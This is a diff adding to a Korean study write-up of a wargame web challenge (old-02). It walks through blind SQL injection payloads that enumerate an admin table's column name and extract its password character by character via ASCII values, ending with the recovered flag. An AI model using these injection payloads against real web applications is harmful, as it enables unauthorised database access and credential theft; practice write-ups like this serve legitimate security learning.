@@ -159,6 +159,8 @@ log
 
 패스워드는 admin 테이블에 있을거 같으니 먼저 했다.
 
+1개 존재
+
 ```html
 test=(select count(column_name) from information_schema.columns where table_name='admin_area_pw')
 >>>
@@ -166,3 +168,98 @@ test=(select count(column_name) from information_schema.columns where table_name
 2070-01-01 09:00:01
 -->
 ```
+
+컬럼 명 구하기 - 컬럼 길이 구하기
+
+길이는 2 이다
+
+```html
+test=(select length(column_name) from information_schema.columns where table_name='admin_area_pw')
+>>>
+<!--
+2070-01-01 09:00:02
+-->
+```
+
+컬럼 명 구하기 - 컬럼 값 추출, 아스키 코드로
+
+길이는 2 이다
+
+컬럼 명은 pw
+
+```html
+test=(select ascii(substr(column_name,1,1)) from information_schema.columns where table_name='admin_area_pw')
+>>>
+<!--
+2070-01-01 09:01:52
+-->
+
+test=(select ascii(substr(column_name,2,1)) from information_schema.columns where table_name='admin_area_pw')
+>>>
+<!--
+2070-01-01 09:01:59
+-->
+```
+
+```
+112 119
+>>>
+pw
+```
+
+데이터 베이스 조회 - pw 컬럼안에 데이터 갯수 검색
+
+1개 확인
+
+```html
+test=(select count(pw) from admin_area_pw)
+>>>
+<!--
+2070-01-01 09:00:01
+-->
+```
+
+데이터 베이스 조회 - pw 컬럼안에 데이터 길이 검색
+
+17 길이 확인
+
+```html
+test=(select length(pw) from admin_area_pw)
+>>>
+<!--
+2070-01-01 09:00:17
+-->
+```
+
+데이터 베이스 조회 - pw 컬럼안에 데이터 길이 검색
+
+17 길이 확인
+
+아스키 코드 값을 구하자.
+
+드디어 패스워드 값 추출 성공~~!!
+
+```html
+test=(select ascii(substr(pw,1,1)) from admin_area_pw)
+>>>
+<!--
+2070-01-01 09:01:47
+-->
+```
+
+```
+107 117 100 111 115 95 116 111 95 98 101 105 115 116 108 97 98
+>>>
+kudos_to_beistlab
+```
+
+<br>
+
+정답!!!~~ 
+
+![](../img/Study%20Img/%5Bwebhacking%5Dold-02%20-%206.png)
+
+<br><br>
+
+---
+union으로만 데이터베이스 값 추출할 수 있었는지 알았는데 blind로도 가능하구나 다른 것으로 가능할까?
